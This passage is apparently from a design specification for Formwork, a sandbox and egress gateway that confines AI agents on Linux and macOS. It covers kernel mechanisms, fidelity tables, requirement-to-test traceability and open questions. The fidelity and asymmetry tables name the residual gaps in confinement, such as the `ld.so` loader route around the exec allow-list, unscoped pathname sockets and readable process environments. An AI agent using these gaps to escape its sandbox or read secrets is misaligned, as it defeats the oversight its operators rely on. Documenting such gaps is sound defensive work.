- Exec restriction: Landlock `FS_EXECUTE` on allowed paths, or seccomp on `execve`. Optional ([FW-ISO4](#fw-iso4)). `execve` of a dynamically linked binary opens its ELF interpreter for execute, so the confiner also grants the architecture's standard loader a listed file names (every standard loader for a listed directory); a non-standard loader is listed by hand. A loader invoked as `ld.so <file>` maps any ELF the session can read without an exec check, so the allow-list is reported Partial. `execve` also opens the file for read, so an exec-only grant runs a file only where a read grant covers it.
- Net default-deny: seccomp denies inet `socket(2)` creation by family (TCP, UDP and raw) at every Landlock ABI, because Landlock net governs TCP only; Landlock net carries the port tier alone (`docs/linux-backend.md`).
- Net port allowlist: Landlock `ACCESS_NET_CONNECT_TCP` (ABI v4+, port-only, no host filtering). Reported Unenforceable below v4.
- Cross-domain socket scoping: `LANDLOCK_SCOPE_ABSTRACT_UNIX_SOCKET` and `LANDLOCK_SCOPE_SIGNAL` (ABI v6) are recent and coarse (they block abstract sockets and signals toward processes outside the domain by parent/child relationship, not per-path allowlisting). Pathname UNIX sockets are not scoped by any Landlock ABI, so a confined process can `connect()` to a socket file it can reach. `/proc/<pid>/environ` of processes outside the domain is refused, because Landlock denies ptrace-class access across the domain boundary, unless the confined process holds `CAP_SYS_ADMIN` or `CAP_PERFMON`, as in a root container (FEP-5 D9, [FW-ISO16](#fw-iso16)). Formwork uses the scopes where present for [FW-ADV-006](#fw-adv-006) and reports the gap otherwise — and does *not* rely on them for the transport ([FW-XR7](#fw-xr7)).
- Anti-shedding: `NO_NEW_PRIVS` + seccomp baseline ([FW-ISO8](#fw-iso8)).
- Datagram and raw closure: seccomp denies AF_INET/AF_INET6 `SOCK_DGRAM` and `SOCK_RAW` under every net posture ([FW-ISO11](#fw-iso11)), so under the port tier nothing resolves names.
- Connect supervisor (FEP-5): under host rules, seccomp user notification routes every `connect()` and addressed `sendto()` to the `formwork` process, which copies the address once, takes the target's socket with `pidfd_getfd`, and performs the operation itself: to the Gateway egress listener, or to a pathname socket that is granted or bound in the session ([FW-EGR7](#fw-egr7), [FW-ISO12](#fw-iso12)). Needs Linux 5.6+ and Yama `ptrace_scope` 0 or 1; `run` refuses host rules without it.
- Isolation tier (FEP-5): `isolate = ["processes"]` adds user, PID, mount and UTS namespaces with a fresh `/proc` and a tmpfs over the session temp directory; `ipc` adds an IPC namespace ([FW-ISO10](#fw-iso10)). Refused before spawn where unprivileged user namespaces are unavailable (Ubuntu 24.04's AppArmor default).

**macOS — Seatbelt (SBPL via `sandbox_init`).**

- Filesystem read/write scope: `file-read*` / `file-write*` with path filters. Clean.
- Exec restriction: `process-exec*` path filters. Optional.
- Net default-deny and port filtering: `network*` deny with `network-outbound` allowances. Seatbelt's remote filters take a port with the host `*` or `localhost` only (characterization C1), so host scoping is the gateway's job; Seatbelt can gate UNIX-socket endpoints by path (the mechanism Chromium's macOS sandbox relies on), so cross-domain socket control is cleaner here than on Linux. The loopback-callback grant ([FW-EGR15](#fw-egr15)) listens on every local address, because `localhost` in a local filter matches them all, so `net-default-deny` is `Partial`.
- Descendant inheritance: the profile applies to the process and its children.
- Channel baseline (FEP-5): `appleevent-send`, `lsopen`, `job-creation`, and the Mach services behind the pasteboard, WindowServer and screen capture, the camera and audio services, and the keychain (until `os-keyring` or a typed exclusion lifts it) are denied, as are `mach-priv-host-port` and `mach-priv-task-port` ([FW-ISO13](#fw-iso13), [FW-ISO14](#fw-iso14)); the service names were characterized on macOS 14 and 15 (C3, C4; `docs/macos-characterization.md`). IOKit stays open (C8). Seatbelt does not mediate `kern.procargs2`, so other same-uid processes' exec-time environments stay readable; `formwork` zeroes its own (C5, [FW-ISO16](#fw-iso16)).
- Host-scoped egress (FEP-5): the profile allows TCP only to the session gateway's loopback port, and the listener admits a connection only when it carries the per-session credential and a session process holds its client end ([FW-EGR8](#fw-egr8), [FW-EGR9](#fw-egr9); C2).

**Both.** MCP runs over the gateway's stdio, an inherited descriptor that behaves identically on both platforms. Egress differs in mechanism (the Linux supervisor, the macOS authenticated listener) but not in what a session can reach, which is why [FW-XR6](#fw-xr6)/[FW-XR7](#fw-xr7) hold across platforms.

**Fidelity summary (typical modern host).**

| Capability | Linux | macOS |
|---|---|---|
| fs read/write scope | Enforced | Enforced |
| net default-deny | Enforced | Partial (the loopback-callback listener also accepts on the host's other addresses, C1) |
| net host allowlist (host rules) | Enforced (connect supervisor + gateway); Partial with a `tunnel:` host | Enforced (gateway listener, credential + peer check, C2); Partial with a `tunnel:` host |
| TLS inspection (`allow:` and method rules) | Enforced (gateway) | Enforced (gateway); Security.framework clients fail closed |
| credential brokering | Partial (the reflection guard recognizes only the credential's wire encodings) | Partial (same) |
| UDP / raw sockets | Enforced (seccomp, every posture) | Enforced (Seatbelt) |
| name resolution under the port tier | none (UDP closed, no Gateway) | mDNSResponder literal (reported, D8) |
| host-service channels | Enforced under host rules; else Partial (locators stripped) | Enforced (C3, C4); camera and microphone Partial (no capture device to characterize) |
| privileged interfaces | Enforced (seccomp) | Partial (Mach privileged ports denied; IOKit open, C8) |
| other processes' environment | Enforced unprivileged (Landlock ptrace refusal); Partial with `CAP_SYS_ADMIN`/`CAP_PERFMON`/`CAP_SYS_PTRACE`; Enforced under `isolate` | Unenforceable (`kern.procargs2` unmediated, C5); `formwork` zeroes its own |
| `isolate` tier | Enforced where user namespaces exist; refused otherwise | Partial (signals and inspection refused; pids, arguments and POSIX IPC names global, C5–C7) |
| private temporary directory | directory form; tmpfs under `isolate` | directory form |
| net port allowlist (direct) | Enforced (ABI v4+) / else Reported | Enforced |
| fs write vs create split ([FW-CAP9](#fw-cap9)) | Enforced (Landlock drops `Make*`) | Enforced (deny `file-write-create`) |
| exec allowlist | Partial (optional; the granted loader runs any readable ELF) | Enforced (optional) |
| MCP tool/resource/prompt shading | Enforced (gateway) | Enforced (gateway) |
| cross-domain UNIX socket block | Partial (recent, coarse) | Enforced (path-gated) |
| filesystem invisibility (ENOENT) | Not provided (EACCES) | Not provided (EPERM/EACCES) |
| sensitive-set metadata denial | Partial (stat residual) | Enforced (metadata deny) |
| environment secret-scrub | Partial (heuristic) | Partial (heuristic) |
| credential floor: absolute rows | Enforced (Landlock deny) | Enforced (Seatbelt deny) |
| credential floor: any-depth rows | Partial (withheld; Landlock cannot root `**/`) | Enforced (regex) |
| credential env strip | Enforced (launcher-contingent) | Enforced (launcher-contingent) |
| `learn` denial feed | Provided (ptrace tap via installed `strace`, [FW-E2E-071](#fw-e2e-071)) | Provided (unified log, post-hoc) |

**Asymmetries that remain (FEP-5 §3.6),** as characterized on macOS 14 and 15 (`docs/macos-characterization.md`):

| Property | Linux | macOS | Why |
|---|---|---|---|
| Violation latency | synchronous per `connect()` | post-hoc (unified log) | Seatbelt has no notification channel |
| Egress endpoint authentication | by construction | credential + peer check (sandbox marker) | SBPL cannot scope `localhost` to a session |
| Loopback listen ([FW-EGR15](#fw-egr15)) | not granted | also listens on the host's other addresses (`net-default-deny` `Partial`) | `localhost` in an SBPL local filter matches every local address (C1) |
| TLS inspection clients | all env-trust clients | excludes Security.framework clients | no per-process trust on macOS |
| Keychain lift granularity | per bus name (Secret Service as a whole) | whole keychain channel | Seatbelt gates `securityd` as one service |
| `os-keyring` lift | `Partial` (shares the session bus with `run-outside`) | `Enforced` (own mach service) | D-Bus routes by bus name inside the socket |
| Other processes' environment | `Enforced` unprivileged; `Partial` with `CAP_SYS_ADMIN`/`CAP_PERFMON`/`CAP_SYS_PTRACE` | `Unenforceable`; `formwork`'s own is zeroed | Landlock's ptrace refusal yields to those capabilities; Seatbelt does not mediate `kern.procargs2` (C5) |
| Any-depth `**/` rows | `Partial` | `Enforced` | Landlock cannot root them |
| `stat` on denied paths | `Partial` | `Enforced` | kernel mechanism |
| `isolate` members | `Enforced` where user namespaces exist | `Partial`: signals and inspection refused, pids, arguments and POSIX IPC names still global (C5–C7) | no namespaces on macOS |
| Privileged interfaces | seccomp | Mach privileged ports denied; IOKit open (`Partial`) | the GPU's user-client classes differ by hardware (C8) |
| Setuid binaries in a session | allowed | refused to every sandboxed process (`forbidden-exec-sugid`: no `ps`, `sudo`, `top`) | Seatbelt platform policy (C5) |
| Private tmp | directory form by default; tmpfs under `isolate` | directory form | no mount namespace on macOS |
| Name resolution under `Ports` | none (PR #29 closes UDP; no Gateway) | mDNSResponder literal | reported (D8); host rules restore it through the Gateway on both |
| ENOENT invisibility | not provided | not provided | §3 non-goal |
| Enforcement API | stable kernel ABI | `sandbox_init` (deprecated, still shipped) | this section |

## 10. Requirements ↔ tests traceability

Each row names the tests that discharge a requirement; where a requirement is discharged by tests named for it rather than by a numbered test, the row says so. Tests defined in §7 but not yet implemented are listed here once rather than marked in each row, and tracked in `docs/STATUS.md`: [FW-E2E-008](#fw-e2e-008), [FW-E2E-020](#fw-e2e-020)–023, [FW-E2E-025](#fw-e2e-025) (as a run on a degraded host), [FW-E2E-032](#fw-e2e-032), [FW-E2E-036](#fw-e2e-036) (as a black-box run; the scrub is unit-tested), [FW-E2E-100](#fw-e2e-100)–102, [FW-E2E-105](#fw-e2e-105), [FW-E2E-106](#fw-e2e-106), [FW-ADV-002](#fw-adv-002), [FW-ADV-003](#fw-adv-003), [FW-ADV-011](#fw-adv-011) and [FW-ADV-025](#fw-adv-025). [FW-E2E-092](#fw-e2e-092) lacks its `git push` half, and [FW-E2E-028](#fw-e2e-028) runs dry (compile on both targets), not enforced. For the requirements FEP-1's egress block, FEP-5 and FEP-6 added, `docs/fep-5-plan.md` §4 and `docs/fep-6-plan.md` §4 record where each test runs.

| Requirement | Primary tests | Also covered by |
|---|---|---|
| [FW-XR1](#fw-xr1) Fidelity honesty | [FW-E2E-024](#fw-e2e-024), 025 | 026, INV5 |
| [FW-XR2](#fw-xr2) Good-not-perfect boundary | (whole §3, §7.10) | ADV-001..006, 012..015 |
| [FW-XR3](#fw-xr3) Fail-closed egress | [FW-E2E-006](#fw-e2e-006), 025 | 007, 008, ADV-003 |
| [FW-XR4](#fw-xr4) Descendant inheritance | [FW-E2E-005](#fw-e2e-005) | ADV-001, 005, INV2 |
| [FW-XR5](#fw-xr5) Single privileged broker | [FW-E2E-019](#fw-e2e-019) | ADV-005 |
| [FW-XR6](#fw-xr6) Behavioral parity | [FW-E2E-028](#fw-e2e-028) | 024, 071, 107 |
| [FW-XR7](#fw-xr7) Mediated transport | [FW-E2E-075](#fw-e2e-075), 076 | ADV-005, ADV-006, [FW-ADV-018](#fw-adv-018), 091 |
| [FW-XR8](#fw-xr8) No agent-influenced escalation | [FW-ADV-001](#fw-adv-001) | [FW-E2E-005](#fw-e2e-005), INV1 |
| [FW-XR9](#fw-xr9) Surface fail-fast | [FW-E2E-062](#fw-e2e-062) | INV5, INV6 |
| [FW-XR10](#fw-xr10) Wrapper transparency | [FW-E2E-086](#fw-e2e-086) | — |
| [FW-XR11](#fw-xr11) Failure attribution | [FW-E2E-086](#fw-e2e-086) (first half; the second is not reachable black-box) | — |
| [FW-CAP1](#fw-cap1) Enumerable vocabulary | [FW-E2E-013](#fw-e2e-013), 001 | — |
| [FW-CAP2](#fw-cap2) Monotonic narrowing | [FW-E2E-005](#fw-e2e-005) | INV1 |
| [FW-CAP3](#fw-cap3) Subtractive default profile | [FW-E2E-003](#fw-e2e-003), 020 | 021, 022 |
| [FW-CAP4](#fw-cap4) Invisibility/denial split | [FW-E2E-013](#fw-e2e-013), 014 | 001, 023 |
| [FW-CAP5](#fw-cap5) Inspectable interpreter | [FW-E2E-026](#fw-e2e-026), 027 | 024 |
| [FW-CAP6](#fw-cap6) Anchored & basename patterns | [FW-E2E-038](#fw-e2e-038) | [FW-FID4](#fw-fid4) |
| [FW-CAP7](#fw-cap7) Metadata denial (sensitive set) | [FW-E2E-037](#fw-e2e-037) | INV5 |
| [FW-CAP8](#fw-cap8) Three-layer evaluation, deny-terminal | [FW-E2E-058](#fw-e2e-058) | INV11, [FW-BP4](#fw-bp4) |
| [FW-CAP9](#fw-cap9) Verb grammar & create/write split | [FW-E2E-056](#fw-e2e-056) | 061 |
| [FW-ISO1](#fw-iso1) Read confinement | [FW-E2E-001](#fw-e2e-001) | 003, 004 |
| [FW-ISO2](#fw-iso2) Write confinement | [FW-E2E-002](#fw-e2e-002) | 004 |
| [FW-ISO3](#fw-iso3) Net default-deny | [FW-E2E-006](#fw-e2e-006) | 007, 008, INV3 |
| [FW-ISO4](#fw-iso4) Optional exec restriction | [FW-E2E-107](#fw-e2e-107) | 024, 060, ADV-001 |
| [FW-ISO5](#fw-iso5) Optional port tier | [FW-E2E-009](#fw-e2e-009) | 025 |
| [FW-ISO6](#fw-iso6) Two postures | [FW-E2E-001](#fw-e2e-001) | — |
| [FW-ISO7](#fw-iso7) Capability detection | [FW-E2E-025](#fw-e2e-025), 026 | INV6 |
| [FW-ISO8](#fw-iso8) Anti-shedding baseline | [FW-ADV-001](#fw-adv-001), [FW-E2E-082](#fw-e2e-082) | 002, INV2, [FW-ADV-020](#fw-adv-020) |
| [FW-ISO9](#fw-iso9) Exec as a verb | [FW-E2E-061](#fw-e2e-061) | [FW-XR6](#fw-xr6), 107 |
| [FW-ISO10](#fw-iso10) Isolation tier | [FW-E2E-079](#fw-e2e-079), 080 | 083 |
| [FW-ISO11](#fw-iso11) Datagram and raw closure | [FW-E2E-075](#fw-e2e-075) | 007, ADV-025 |
| [FW-ISO12](#fw-iso12) Pathname socket mediation | [FW-E2E-076](#fw-e2e-076) | 082 |
| [FW-ISO13](#fw-iso13) Channel baseline | [FW-E2E-081](#fw-e2e-081), 082 | 084, 088, ADV-020 |
| [FW-ISO14](#fw-iso14) Privileged-interface baseline | characterization C8 (`macos_characterize.rs`) | Partial on macOS: IOKit open |
| [FW-ISO16](#fw-iso16) Process-environment disclosure | [FW-E2E-083](#fw-e2e-083) | ADV-025 |
| [FW-ISO17](#fw-iso17) Opener shim | [FW-E2E-090](#fw-e2e-090) | ADV-020 |
| [FW-ISO18](#fw-iso18) Brokered URL open | [FW-E2E-090](#fw-e2e-090) | — |
| [FW-GW1](#fw-gw1) Transport-agnostic backends | [FW-E2E-013](#fw-e2e-013) (stdio only; http/SSE backends not built) | 019 |
| [FW-GW2](#fw-gw2) Tool shading | [FW-E2E-013](#fw-e2e-013), 014 | ADV-004, 016 |
| [FW-GW3](#fw-gw3) Full-surface policy | [FW-E2E-015](#fw-e2e-015), 016, 017 | — |
| [FW-GW4](#fw-gw4) Single door | [FW-E2E-075](#fw-e2e-075) | 006, ADV-003 |
| [FW-GW5](#fw-gw5) Backend confinement | [FW-E2E-019](#fw-e2e-019) | ADV-005 |
| [FW-GW6](#fw-gw6) fd minting | retired with the seam | — |
| [FW-GW7](#fw-gw7) Least-privilege gateway | [FW-E2E-019](#fw-e2e-019) | ADV-003 |
| [FW-GW8](#fw-gw8) Transparent passthrough | [FW-E2E-018](#fw-e2e-018) | 020, 021 |
| [FW-GW9](#fw-gw9) Pattern-matched shading | [FW-E2E-065](#fw-e2e-065), 066, 067 | 068, 069, ADV-004 |
| [FW-TRA1](#fw-tra1) Ambient reuse | [FW-E2E-020](#fw-e2e-020), 021 | 022 |
| [FW-TRA2](#fw-tra2) Toolchains run clean | [FW-E2E-020](#fw-e2e-020), 021, 022 | 023 |
| [FW-TRA3](#fw-tra3) Sensitive-set subtraction | [FW-E2E-003](#fw-e2e-003) | 004 |
| [FW-TRA4](#fw-tra4) Graceful denial | [FW-E2E-023](#fw-e2e-023) | 020, 021 |
| [FW-TRA5](#fw-tra5) Writable working set | [FW-E2E-002](#fw-e2e-002), 022 | 020 |
| [FW-TRA6](#fw-tra6) Low overhead | §8 targets | 020, 021 |
| [FW-TRA7](#fw-tra7) Execution-vector write protection | [FW-E2E-039](#fw-e2e-039) | — |
| [FW-TRA8](#fw-tra8) Agent-state & local-secret coverage | [FW-E2E-038](#fw-e2e-038) | [FW-E2E-003](#fw-e2e-003) |
| [FW-TRA9](#fw-tra9) Launcher-owned paths | [FW-E2E-089](#fw-e2e-089) | — |
| [FW-TRA10](#fw-tra10) Private temporary directory | [FW-E2E-089](#fw-e2e-089) | 079 |
| [FW-FID1](#fw-fid1) Per-capability report | [FW-E2E-024](#fw-e2e-024) | 025 |
| [FW-FID2](#fw-fid2) Dry-run / audit | [FW-E2E-026](#fw-e2e-026) | 027 |
| [FW-FID3](#fw-fid3) Runtime observability | [FW-E2E-024](#fw-e2e-024) | — |
| [FW-FID4](#fw-fid4) Deterministic compile | [FW-E2E-027](#fw-e2e-027) | 026 |
| [FW-FID6](#fw-fid6) Rule provenance & explain | [FW-E2E-059](#fw-e2e-059) | [FW-CAP5](#fw-cap5), [FW-CAP8](#fw-cap8) |
| [FW-FID7](#fw-fid7) Resolved-input disclosure | [FW-E2E-069](#fw-e2e-069) | 059, 062 |
| [FW-FID8](#fw-fid8) Per-backend report lines | [FW-E2E-087](#fw-e2e-087) | 079, 083 |
| [FW-FID9](#fw-fid9) Self-explaining refusals | [FW-E2E-077](#fw-e2e-077) | 085, 098 |
| [FW-FID10](#fw-fid10) Host-session detection | [FW-E2E-087](#fw-e2e-087) | — |
| [FW-FID11](#fw-fid11) Explain for hosts and channels | [FW-E2E-088](#fw-e2e-088), 089 | 098 |
| [FW-FID12](#fw-fid12) Egress refusal reasons | [FW-ADV-022](#fw-adv-022) | ADV-023, 098 |
| [FW-FID13](#fw-fid13) Egress grant records | tests named for it (`formwork-gateway/tests`) | — |
| [FW-ENV1](#fw-env1) Environment axis | [FW-E2E-036](#fw-e2e-036) | [FW-FID1](#fw-fid1) |
| [FW-ENV2](#fw-env2) Default secret-shaped scrub | [FW-E2E-036](#fw-e2e-036) | [FW-TRA2](#fw-tra2) |
| [FW-BP1](#fw-bp1) One model, many surfaces | [FW-E2E-043](#fw-e2e-043), 060 | 042 |
| [FW-BP2](#fw-bp2) Override precedence | [FW-E2E-042](#fw-e2e-042), 060 | 043 |
| [FW-BP3](#fw-bp3) `extends` composition | [FW-E2E-044](#fw-e2e-044) | — |
| [FW-BP4](#fw-bp4) allow/deny/subtract | [FW-E2E-042](#fw-e2e-042) | 045, 049 |
| [FW-BP5](#fw-bp5) Path sigils | [FW-E2E-055](#fw-e2e-055) | — |
| [FW-BP6](#fw-bp6) Flat verb rules | [FW-E2E-058](#fw-e2e-058), 061 | [FW-CAP9](#fw-cap9) |
| [FW-BP7](#fw-bp7) Mode posture | [FW-E2E-057](#fw-e2e-057), 060 | — |
| [FW-BP8](#fw-bp8) Discovery trust scope | [FW-E2E-070](#fw-e2e-070) | [FW-XR8](#fw-xr8) |
| [FW-BP9](#fw-bp9) Channel policy shape | [FW-E2E-088](#fw-e2e-088) | — |
| [FW-BP10](#fw-bp10) Channel layering | [FW-E2E-088](#fw-e2e-088) | — |
| [FW-BP11](#fw-bp11) Locator variables | [FW-E2E-088](#fw-e2e-088) | 087 |
| [FW-BP12](#fw-bp12) Credential entry forms | [FW-E2E-078](#fw-e2e-078), 099 | — |
| [FW-BP13](#fw-bp13) Host-rule grammar | [FW-E2E-104](#fw-e2e-104) | 077 |
| [FW-BP14](#fw-bp14) One host, one grade | [FW-E2E-104](#fw-e2e-104) | — |
| [FW-BP15](#fw-bp15) Verb atoms | unit tests (`blueprint_load.rs`) | — |
| [FW-BP16](#fw-bp16) Host target shape | [FW-E2E-104](#fw-e2e-104) | — |
| [FW-CRED1](#fw-cred1) Typed catalog | [FW-E2E-045](#fw-e2e-045), 046 | 049 |
| [FW-CRED2](#fw-cred2) Two kinds, two arms | [FW-E2E-045](#fw-e2e-045), 046 | 050 |
| [FW-CRED3](#fw-cred3) Env-points-to-file | [FW-E2E-047](#fw-e2e-047) | — |
| [FW-CRED4](#fw-cred4) Deny-superset default | [FW-E2E-045](#fw-e2e-045), 046, 049 | — |
| [FW-CRED5](#fw-cred5) Exclude-by-type | [FW-E2E-048](#fw-e2e-048) | ADV-013 |
| [FW-CRED6](#fw-cred6) Generic backstop | [FW-E2E-049](#fw-e2e-049) | ADV-015 |
| [FW-CRED7](#fw-cred7) Channel split | [FW-E2E-045](#fw-e2e-045), 046 | ADV-012, INV9 |
| [FW-CRED8](#fw-cred8) Report mechanism | [FW-E2E-050](#fw-e2e-050) | ADV-014 |
| [FW-CRED9](#fw-cred9) Floor enforceability | [FW-E2E-050](#fw-e2e-050) | INV5; Linux kernel enforcement deferred |
| [FW-CRED10](#fw-cred10) Brokered floor | [FW-E2E-078](#fw-e2e-078) | 099 |
| [FW-CRED11](#fw-cred11) Credential presentation | [FW-E2E-078](#fw-e2e-078), 099 | 100, ADV-025 |
| [FW-CRED12](#fw-cred12) Broker host closure | [FW-E2E-104](#fw-e2e-104) | — |
| [FW-CRED13](#fw-cred13) Service-located credentials | [FW-E2E-081](#fw-e2e-081) | characterization C9 |
| [FW-CRED14](#fw-cred14) Placeholder timing | [FW-E2E-078](#fw-e2e-078) | 099 |
| [FW-CRED15](#fw-cred15) Credential custody | [FW-E2E-078](#fw-e2e-078) | INV13 |
| [FW-CRED16](#fw-cred16) Broker custody | tests named for it (`fep6_run.rs`) | ADV-025 |
| [FW-CRED17](#fw-cred17) Reflection guard | [FW-ADV-021](#fw-adv-021) | ADV-025 |
| [FW-CRED18](#fw-cred18) No credential on OPTIONS | [FW-E2E-099](#fw-e2e-099) | — |
| [FW-CRED19](#fw-cred19) No credential in cleartext | [FW-E2E-104](#fw-e2e-104) | — |
| [FW-DISC1](#fw-disc1) Learning mode | [FW-E2E-051](#fw-e2e-051) | 054, 062, 064, 071 |
| [FW-DISC2](#fw-disc2) Reverse compile | [FW-E2E-051](#fw-e2e-051) | 052, 053, 064, 071 |
| [FW-DISC3](#fw-disc3) Catalog floor | [FW-ADV-013](#fw-adv-013), 015 | 051, INV8 |
| [FW-DISC4](#fw-disc4) Auto-widen zone | [FW-E2E-052](#fw-e2e-052) | 054 |
| [FW-DISC5](#fw-disc5) Review diff | [FW-E2E-051](#fw-e2e-051), 063 | 053 |
| [FW-DISC6](#fw-disc6) Provenance | [FW-E2E-053](#fw-e2e-053) | 063 |
| [FW-DISC11](#fw-disc11) Loop drivability | [FW-E2E-063](#fw-e2e-063) | 062 |
| [FW-DISC12](#fw-disc12) Host and channel discovery | [FW-E2E-085](#fw-e2e-085) | 105 |
| [FW-EGR1](#fw-egr1) Host-scoped egress | [FW-E2E-029](#fw-e2e-029) | 075, 098 |
| [FW-EGR2](#fw-egr2) Empty means deny | [FW-E2E-030](#fw-e2e-030) | 104 |
| [FW-EGR3](#fw-egr3) Hostname canonicalization | [FW-ADV-007](#fw-adv-007) | ADV-024 |
| [FW-EGR4](#fw-egr4) SSRF / metadata default-block | [FW-E2E-031](#fw-e2e-031), [FW-ADV-008](#fw-adv-008) | ADV-023, 098 |
| [FW-EGR5](#fw-egr5) Honest allowlist fidelity | [FW-E2E-032](#fw-e2e-032) | 098 |
| [FW-EGR6](#fw-egr6) No unauthenticated egress door | [FW-ADV-009](#fw-adv-009) | 075, ADV-019 |
| [FW-EGR7](#fw-egr7) Supervised connect (Linux) | [FW-E2E-075](#fw-e2e-075) | 076, ADV-018 |
| [FW-EGR8](#fw-egr8) Sole egress endpoint (macOS) | [FW-E2E-075](#fw-e2e-075) | 091 |
| [FW-EGR9](#fw-egr9) Registered egress | [FW-E2E-075](#fw-e2e-075), [FW-ADV-019](#fw-adv-019) | ADV-009 |
| [FW-EGR10](#fw-egr10) Inspected host rule | [FW-E2E-077](#fw-e2e-077) | 098, ADV-022 |
| [FW-EGR11](#fw-egr11) Request canonicalization | [FW-ADV-017](#fw-adv-017) | ADV-024 |
| [FW-EGR12](#fw-egr12) Resolver closure | [FW-E2E-075](#fw-e2e-075) | 098 |
| [FW-EGR13](#fw-egr13) Ephemeral CA | [FW-E2E-097](#fw-e2e-097) | 078 |
| [FW-EGR14](#fw-egr14) Gateway hosting | [FW-E2E-075](#fw-e2e-075) | 098 |
| [FW-EGR15](#fw-egr15) Loopback listen (macOS) | [FW-E2E-091](#fw-e2e-091) | — |
| [FW-EGR16](#fw-egr16) Tunnel server name | [FW-ADV-022](#fw-adv-022) | 098 |
| [FW-EGR17](#fw-egr17) Single resolution | [FW-ADV-023](#fw-adv-023) | ADV-008 |
| [FW-EGR18](#fw-egr18) Gateway self-exclusion | [FW-ADV-023](#fw-adv-023) | — |
| [FW-EGR19](#fw-egr19) Local and private admission | [FW-ADV-023](#fw-adv-023) | 029, 103 |
| [FW-EGR20](#fw-egr20) Inspected ALPN | [FW-ADV-022](#fw-adv-022) | — |
| [FW-EGR21](#fw-egr21) Streamed bodies | [FW-E2E-092](#fw-e2e-092) | 093 |
| [FW-EGR22](#fw-egr22) Authorized forwarding | [FW-ADV-017](#fw-adv-017) | 077 |
| [FW-EGR23](#fw-egr23) Reflective methods | [FW-ADV-021](#fw-adv-021) | 102 |
| [FW-EGR24](#fw-egr24) Upstream verification | [FW-E2E-098](#fw-e2e-098) | 103 |
| [FW-EGR25](#fw-egr25) Constrained session CA | [FW-E2E-097](#fw-e2e-097) | 094 |
| [FW-EGR26](#fw-egr26) Upstream proxy | [FW-E2E-103](#fw-e2e-103) | — |
| Launcher arm (§2) | [FW-E2E-046](#fw-e2e-046), 050 | 047, INV7, ADV-014 |

## 11. Open questions

**Naming of the layers.** Whether *Formwork* names the whole system or the confiner alone, with a separate name for the gateway. The mould metaphor argues for confiner-only; product convenience argues for the umbrella. Unresolved.

**Exec restriction in v1.** *Closed:* exec restriction ships enabled-optional, as the `exec`/`readexec` verbs ([FW-ISO4](#fw-iso4), [FW-ISO9](#fw-iso9)), off by default.

**fd-minting default.** *Closed by FEP-5.* On Linux connections are minted on demand through the connect supervisor ([FW-EGR7](#fw-egr7)); on macOS the session reaches a static, credentialed Gateway endpoint. The injected-fd seam that pre-opened or minted fds was retired unwired ([FW-GW6](#fw-gw6)).

**Credential brokering.** *Closed by FEP-5 §3.2.* Excluding a type ([FW-CRED5](#fw-cred5)) exposes the file/var to the agent; `broker:<type>` instead keeps the floor and has the Gateway present the credential on inspected hosts, with a per-session placeholder in the agent's environment ([FW-CRED11](#fw-cred11)–[FW-CRED14](#fw-cred14), [FW-INV13](#fw-inv13)). *(The older sensitive-set-discovery question — auto-detect vs configure the subtracted set — was resolved by the typed catalog + backstop, §5.9, deny-the-superset by default, and observe-then-widen discovery, §5.10.)*

**Blueprint serialization format.** TOML is the shipped surface (strict, `deny_unknown_fields` as a security asset), fixed at FEP-2 planning; it fights nesting exactly where Blueprints are deepest. Revisit only with a concrete need for logic, and then by adopting an existing configuration language (§4), never authoring one.

**Linux gateway egress isolation build-vs-buy.** *Narrowed by FEP-5:* the agent's egress is mediated by the connect supervisor, so a network namespace is only an optional hardening path for the gateway's own backends ([FW-GW7](#fw-gw7)). Whether that path reuses `pasta`/`slirp4netns` or drives `unshare`/nftables directly stays open. The egress proxy itself is built, in-process and in Rust (FEP-6 §3).

**Violation streaming.** Host-scoped egress landed with FEP-5 (host rules in `rules`, through the session Gateway). Each refusal is one operator-channel line naming its reproduction ([FW-FID9](#fw-fid9)); a real-time violation stream for embedding hosts ([FW-FID5](docs/fep-1.md#fw-fid5)) stays deferred.

**Egress-specific questions.** FEP-5 §9 and FEP-6 §11 hold the questions the egress engine left open: a D-Bus filtering proxy to separate `os-keyring` from `run-outside` on Linux, HTTP/2 on inspected hosts, in-session loopback servers ([FW-E2E-106](#fw-e2e-106)), non-HTTP TCP such as SSH and database protocols, request-signing credentials, per-process trust on macOS, and portable fs groups for `unveil` mode.

**Windows.** Out of scope for this proposal. If needed later, the analogous primitives (AppContainer, Restricted Tokens, Named Pipes for the transport) would be a third backend behind the same compiler.

## 12. Implementation order

Kernel-mechanism-first, honesty-first, reuse-validated-early:

1. **Compiler + FidelityReport + dry-run**, with the deterministic-compile and dry-run tests ([FW-E2E-026](#fw-e2e-026), 027). No kernel calls; runs anywhere, including CI on macOS for Linux policies.
2. **Linux confiner** (Landlock fs + seccomp baseline + net-deny), spawn-confined posture, with the filesystem, descendant, and anti-shedding tests ([FW-E2E-001](#fw-e2e-001)..005, ADV-001, 002) and report-soundness ([FW-E2E-024](#fw-e2e-024)).
3. **macOS confiner** (Seatbelt), same test set, then cross-platform equivalence ([FW-E2E-028](#fw-e2e-028)).
4. **Reuse validation** against real toolchains ([FW-E2E-020](#fw-e2e-020)..023) — early, because if the default profile is not transparent enough to reuse the environment, the philosophy has failed and the profile needs rework before anything else is built on it.
5. **fd-injection transport** and the seam tests ([FW-E2E-010](#fw-e2e-010), 011, 012), establishing that the agent never depends on in-sandbox connect or socket-path gating — built and verified on both platforms, then retired unwired once FEP-5 (step 11) carried egress through the connect supervisor and the authenticated listener; the crate is in git history.
6. **Gateway** (transport-agnostic backends, shading, full-surface policy, transparent passthrough, backend-confinement recursion) with [FW-E2E-013](#fw-e2e-013)..019 and ADV-003, 004, 005.
7. **Degraded-host honesty and optional tiers** ([FW-E2E-009](#fw-e2e-009), 025, ADV-006), confirming Formwork reports rather than pretends when a kernel cannot enforce a requested capability.
8. **Capability-model hardening** (FEP-1): the env axis ([FW-ENV1](#fw-env1)/2), execution-vector write-subtract ([FW-TRA7](#fw-tra7)), sensitive-set metadata denial ([FW-CAP7](#fw-cap7)), any-depth patterns ([FW-CAP6](#fw-cap6)), extended sensitive set ([FW-TRA8](#fw-tra8)), and the anti-escalation guarantee ([FW-XR8](#fw-xr8)) — landed and compiled/enforced on both backends. The fs additions are real-Seatbelt verified ([FW-E2E-037](#fw-e2e-037)..039); the env axis (a CLI-shell spawn transform, not a kernel capability) by unit tests plus the FidelityReport. Host-scoped egress landed with steps 11–12; the violation stream ([FW-FID5](docs/fep-1.md#fw-fid5)) remains deferred in `docs/fep-1.md`.

